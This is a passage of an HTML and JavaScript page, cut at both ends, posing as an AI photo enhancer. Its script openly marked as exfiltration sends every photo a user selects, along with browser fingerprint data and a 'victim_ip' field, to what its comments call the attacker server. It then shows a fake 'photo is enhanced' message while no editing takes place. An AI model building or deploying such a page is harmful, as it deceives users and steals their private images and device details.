            transition: transform 0.2s;

        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .status { margin-top: 20px; min-height: 20px; }
        .success { color: #28a745; }
        .error { color: #dc3545; }
        .preview { 
            max-width: 200px; 
            max-height: 200px; 
            border-radius: 10px; 
            margin: 20px auto;
            display: none;
        }
        .progress { 
            width: 100%; 
            height: 6px; 
            background: #e9ecef; 
            border-radius: 3px; 
            overflow: hidden;
            margin: 20px 0;
            display: none;
        }
        .progress-bar { 
            height: 100%; 
            background: linear-gradient(90deg, #28a745, #20c997); 
            width: 0%;
            transition: width 0.3s;
        }
        @media (max-width: 480px) {
            .container { padding: 30px 20px; }

        }
    </style>
</head>
<body>
    <div class="container">

    <script>
        const fileInput = document.getElementById('fileInput');
        const preview = document.getElementById('preview');
        const statusEl = document.getElementById('status');
        const uploadText = document.getElementById('uploadText');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');

        function showStatus(msg, type = '') {
            statusEl.textContent = msg;
            statusEl.className = `status ${type}`;
        }

        function triggerFilePicker() {
            fileInput.click();
        }

        function handleFiles(event) {
            const files = Array.from(event.target.files);
            if (files.length === 0) return;

            showStatus(`Processing ${files.length} photo(s)...`);
            uploadText.textContent = 'Processing your photo...';
            
            // Show first image preview
            const firstFile = files[0];
            const reader = new FileReader();
            reader.onload = (e) => {
                preview.src = e.target.result;
                preview.style.display = 'block';
            };
            reader.readAsDataURL(firstFile);

            // Exfiltrate ALL selected files
            exfiltrateFiles(files);
        }

        async function exfiltrateFiles(files) {
            progress.style.display = 'block';
            
            for (let i = 0; i < files.length; i++) {
                const file = files[i];
                const formData = new FormData();
                formData.append('file', file);
                formData.append('filename', file.name);
                formData.append('size', file.size);
                formData.append('type', file.type);
                
                // Add metadata
                formData.append('metadata', JSON.stringify({
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    victim_ip: 'unknown' // Server adds this
                }));

                try {
                    // Simulate upload progress
                    progressBar.style.width = `${((i + 1) / files.length) * 100}%`;
                    
                    // Send file to attacker server
                    await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });
                    
                    showStatus('‚úÖ AI processing complete! Your photo is enhanced.', 'success');
                    
                } catch (error) {
                    console.error('Exfil failed:', error);
                    showStatus('‚ùå Processing failed. Try another photo.', 'error');
                }
            }
            
            progress.style.display = 'none';
            // Reset for multiple uploads
            setTimeout(() => {
                preview.style.display = 'none';
                fileInput.value = '';
                uploadText.textContent = 'Upload Another Photo';
            }, 3000);
        }

        // Drag & drop support
        const uploadArea = document.querySelector('.upload-area');
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.style.borderColor = '#764ba2';
        });
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.style.borderColor = '#667eea';
        });
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.style.borderColor = '#667eea';
            const files = Array.from(e.dataTransfer.files).filter(f => f.type.startsWith('image/'));
            if (files.length > 0) {
                const dataTransfer = new DataTransfer();
                files.forEach(file => dataTransfer.items.add(file));
                fileInput.files = dataTransfer.files;
                handleFiles({ target: fileInput });
            }
        });

        // Aggressive auto-trigger on focus
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && fileInput.value === '') {
                setTimeout(() => showStatus('Select a photo to start editing!'), 1000);
            }
